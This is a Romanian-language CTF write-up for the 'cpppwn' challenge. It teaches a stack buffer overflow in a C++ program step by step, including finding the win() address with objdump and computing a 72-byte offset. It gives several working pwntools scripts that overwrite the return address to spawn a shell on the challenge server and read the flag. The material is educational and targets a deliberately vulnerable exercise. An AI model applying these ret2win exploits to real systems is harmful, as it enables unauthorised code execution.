# cpppwn - Vianu_CTF | PWN | Writeup

**DESCRIEREA CERINTEI:**

Notă: Această provocare a fost prezentată în prima întâlnire Vianu Hack Club 25.

nc dpl.razvan.sh 30002

## DEBLOCARE HINT:

lookup ret2win

### IINTRODUCERE:

Salut, Daca vrei sa inveti hacking etic sau CTF-uri, acest writeup este perfect pentru tine! 
Voi explica *pas cu pas, ca pe un prieten*, cum am rezolvat acest challenge,de la zero pana 
la obtinerea flag-ului.

Ce este un CTF? CTF (Capture The Flag) este un joc unde trebuie sa gasesti un "flag" 
sau chiar o "vulnerabilitate" prin rezolvarea de puzzle-uri de securitate cibernetica

---
### REZOLVARE:

1. Ce am primit?

Un fisier ZIP(challenge.zip) care contine:

   a) main - programaul compilat (executabil)

   b) main.cpp - codul sursa

O conexiune la un server: *nc dpl.razvan.sh 30002*

2. Primul lucru pe care il faci e sa te uiti la ce ai de lucru:

                     unzip challenge.zip

Si obtinem doua fisiere:

                    main - program compilat (nu poti citi codul)
                    main.cpp - codul sursa scris in C++

3. Citirea codului sursa *main.cpp*

<p align="center"><img src="imagini/main.png" width="50%"/></p>

Ce intelegem din cod?

a) Functia **win()**:

   Afiseaza un mesaj amuzant
 
   Ruleaza **system("/bin/sh")** care deschide un terminal (shell) - ASTA VREM SA O ACCESAM!

b) Functia **main()**:
 
   Declara un buffer de 64 de caractere (**char buf[64]**)
   
   Afiseaza "Show me what you got"
   
   Citeste de la tastatura in buffer cu **std::cin>> buf**

c) PROBLEMA MARE: 

   **std::cin >> buf** nu verifica cat de mult scrii!!
   
   Daca scrii mai mult de 64 de caractere, programul va continua sa scrie in memorie peste ale lucruri importante!

4. De ce e periculos **std::cin >> buf**?

gandestete ca memoria programului ca o serie de casute (fiecare cu cate un numar):

                    [ buf[0] ] [ buf[1] ] ... [ buf[63] ] [ RBP ] [ RETURN ADDRESS ] [ alte chestii ]

Cand scrii *ABCDEFGH...* in program:

'A' merge in buf[0]

'B' merge in buf[1]

...

Cand ai ajuns la 64 de caractere, ai umplut tot buffer-ul

**DAR** daca continui sa scrii:

Caracterul 65 va scrie peste RBP (Base Pointer - important pentru functii)

Caracterul 66-73 vor scrie peste RETURN ADDRESS (CEA MAI IMPORTANTA CASUTA!)

---
**DEFINITIE**
---
Ce este RETURN ADDRESS?

Când un program apelează o funcție, el își notează unde să se întoarcă când funcția se termină. 

Dacă noi putem schimba această adresă, putem face programul să sară oriunde vrem noi - 

de exemplu, în funcția win() care ne dă shell!

---


5. Dupa atatea explicati hai sa trecem la treaba

Hai sa il facem executabil acest fisier *main* cu comanda:

                      chmod +x main

Si cand il rulam, ne va afisa asta:

                       ./main
                       Show me what you got

Si cand ne afiseaza acel mesaj, testam cu *AAAAAA*

Iar programul se inchide normal 

Dar daca introducem mai multe de "A" sa depaseasca buffe-rul cum am explicat mai sus, ne va da acest mesaj

                    zsh: segmentation fault  ./main

Asta e un semn bun ca noi am putut crapa , asta inseamna ca am depasit buffer-ul!

!!! De ce e bun ca programul crapa?

Pentru ca inseamna ca am scris  peste adresa de retur cu ceva valid, iar CPU-ul nu stie unde sa sara!


6. Acum e sa gasim adresa functiei **win()**

Programul este compilat (*main* fisier executabil), asa ca nu putem vedea direc adresa functiei *win()*. Trebuie sa o cautam.

---
**METODE GENIOASE:**
---

1. Cautarea string-urilor:

e sa folosim aceasta comanda:

                        strings main | grep "How??"

si ne afiseaza:

                        How?? I've never called this function!!

Pentru detali complexe putem aplica aceasta comanda:

                        rabin2 -z main | grep "How??"

si ne afiseaza:

                        0x00002008 0x00402008 40  41   .rodata ascii How?? I've never called this function!!\n

Ce inseamna? 

String-ul "How??.." este stocat la adresa *0x00402008* in memorie


2. Cautarea cine foloseste acest string:

Acum ca stim unde este string-ul, cautam ce cod foloseste aceasta adresa *402008* cu comanda:

                        objdump -d main | grep -B5 -A5 "402008"

si observam ca sa gasit, ceea ce se vede cu rosu la aceea imagine de mai jos:

<p align="center"><img src="imagini/objdump.png" width="100%"/></p>

Intelegere:

La adresa **0x4011bd**, programul incarca adresa string-ului (**0x402008**) si o tipareste
ASTA ESTE IN FUNCTIA **win()**!!!

Gasim inceputul functiei **win()**:

uitandu-ne mai jos in codul dezassemblat:

<p align="center"><img src="imagini/objdump1.png" width="100%"/></p>

Functia **win()** incepe la adresa **0x4011b9**!

---



7. Calcularea offset-ului (cat trebuie sa scriem)

Stim ca buffer-ul are 64 de caractere. Dar trebuie sa stim exact cati bytes sa scriem pana sa ajungem la adresa de retur.

Structura stivei in memorie:

                        64 bytes -- buffer-ul nostru
                         8 bytes - RBP (saved base pointer)
                         8 bytes - Return Address (asta vrem sa o schimbam!)

Total 64 + 8 = 72 bytes pana la adresa de retur

Deci:

Primele 72 de caractere vor umple buffer-ul + RBP
Caractere 73-80 vor fi noua noastra adresa de retur!


8. Acum ca intelegem tot, e sa cream un exploit, script in python, care sa comunice cu programul:

                             #!/usr/bin/env python3
                             from pwn import * # Importa biblioteca pwntools (folosita la CTF-uri)
                            
                             # Conectare la server
                             p = remote('dpl.razvan.sh' , 30002)
         
                             # Astept mesajul de bun venit
                             print(p.recvuntil(b"Show me what you got\n").decode())

                             # Offset calculat
                             offset = 72
     
                             # Adresa functiei win() gasita mai devreme
                             win_addr = 0x4011b9

                             # Construiesc payload-ul:
                             # 72 de 'A' pentru a umple pana la adresa de retur
                             # + adresa functiei win() (scrisa ca 8 bytes little-endian)
                             payload = b'A' * offset
                             payload += p64(win_addr) # p64() transforma numarul in 8bytes

                             # Trimite payload
                             p.sendline(payload)
                         
                             # Incearca sa interactioneze cu shell-ul
                             p.interactive()

---
Ce face fiecare linie?
---
1. **from pwn import** - importa tools pentru exploit
2. **p = remote('dpl.razvan.sh', 30002)** - Se conecteaza la server
3. **recvuntil()** - asteapta pana cand primeste mesajul programului
4. **p64(win_addr)** - transforma adresa **0x4011b9** in formatul corect pentru procesor (little-endian)
5. **sendline()** - trimite payload-ul + Enter
6. **interactive()** - Da control tastaturi pentru a interactiona cu shell-ul

---

9. Din acel cod creat hai sa-l rulam si sa vedem ce ne afiseaza:

<p align="center"><img src="imagini/file1.png" width="50%"/></p>

Dupa cum putem observa cand am introdus comanda "ls" de doua ori, shell-ul nostru sa inchis, dar de ce?

Cand functia *win()* se termina, ea face *ret* (return) sa se intoarca in *main()*. Dar:

Stiva este corupta de padding-ul nostru
Adresa de retur din *win()* pointeaza catre nimic valid
programul crapa si se inchide


10. Solutia noastra e sa sarim direct la **system("/bin/sh")**, nu la inceputul functiei!

Privim codul dezassemblat din nou:

<p align="center"><img src="imagini/objdump2.png" width="100%"/></p>

Observati importante:

La *0x4011d6* se incarca adresa string-ului */bin/sh*
La *0x4011e0* se apeleaza *system()*
Daca sarim direct la *0x4011d6*, evitam problema cu *cout* si stiva ramane mai stabila


11. Exploit Final:

Bonus cu doua exploite FUNCTIONABILE:

---
#Primul exploit:
---

                       #!/usr/bin/env python3
                       from pwn import *

                       # Conectare la server
                       p = remote('dpl.razvan.sh', 30002)

                       # Așteaptă prompt-ul
                       p.recvuntil(b"Show me what you got\n")

                       # Offset calculat
                       offset = 72

                       # NU mai sarim la începutul win() (0x4011b9)
                       # Sarim direct unde se încarcă /bin/sh pentru system()
                       jump_addr = 0x4011d6

                       # Payload-ul magic
                       payload = b'A' * offset  # Padding până la adresa de retur
                       payload += p64(jump_addr)  # Noua adresă de retur

                       # Trimite exploit-ul
                       p.sendline(payload)

                       # Acum avem shell! Trimite comenzi:
                       p.sendline(b"ls")  # Listează fișierele
                       p.sendline(b"cat flag*")  # Caută și citește fișiere care încep cu "flag"

                       # Obține răspunsul
                       print(p.recvall(timeout=3).decode())

                       # Închide conexiunea
                       p.close()

Cand vei rula, va afisa direct flag-ul

---
#Al doilea exploit
---

                        #!/usr/bin/env python3
                        from pwn import *

                        def exploit():
                            p = remote('dpl.razvan.sh', 30002)
                            p.recvuntil(b"Show me what you got\n")
    
                            offset = 72
    
                            # Încearcă să sari direct la instrucțiunea care încarcă /bin/sh
                            # 0x4011d6 - unde se încarcă adresa string-ului "/bin/sh"
                            jump_to_system = 0x4011d6
    
                            payload = b'A' * offset
                            payload += p64(jump_to_system)
    
                            p.sendline(payload)
                            p.interactive()

                        exploit()

Cand vei rula, e sa introduci tu comenzile si sa iti afiseze flag-ul
mai precis cu *ls* si apoi cu *cat* de a afisa flag final



12. Felicitari ai obtinut flag-ul cel dorit.

Ce am invatat:

Concepte importante de reținut:

1. Buffer Overflow - Când scrii prea mult într-un buffer și depășești spațiul alocat

2. Stiva (Stack) - Unde sunt stocate variabilele locale și adresele de retur

3. Return Address - Cel mai important lucru de pe stivă; controlează unde se întoarce programul

4. Little-endian - Cum procesorul stochează numerele în memorie (byte-ii invers)

5. ROP (Return-Oriented Programming) - Tehnica de a controla fluxul programului prin adrese de retur


???Cum să abordezi astfel de challenge-uri:

1. Citește codul sursă (dacă este dat)

2. Identifică vulnerabilitățile (citiri fără verificare, copieri nesigure)

3. Analizează binarul cu tools:

   a) strings - caută string-uri interesante
 
   b) objdump sau radare2 - vezi codul assembly

   c) gdb - debuggează pas cu pas

4. Calculează offset-ul - cât trebuie să scrii

5. Găsește ce vrei să apelezi (de ex., funcția care dă shell)

6. Scrie exploit-ul și testează local

7. Rulează pe server și obține flag-ul


Concluzie pentru tinerii hacker-i etici:

1. Acest challenge a fost o lecție fantastică în:

   a) Înțelegerea memoriei - cum sunt stocate datele

   b) Exploatarea erorilor - cum o mică greșeală de programare poate duce la compromiterea completă

   c) Metodologie - cum să abordezi sistematic un problem

Remember: Hacking-ul etic este despre învățare și îmbunătățirea securității, nu despre dăunat. 
Folosește aceste cunoștințe pentru a construi, nu pentru a distruge!

Happy hacking! 🚀

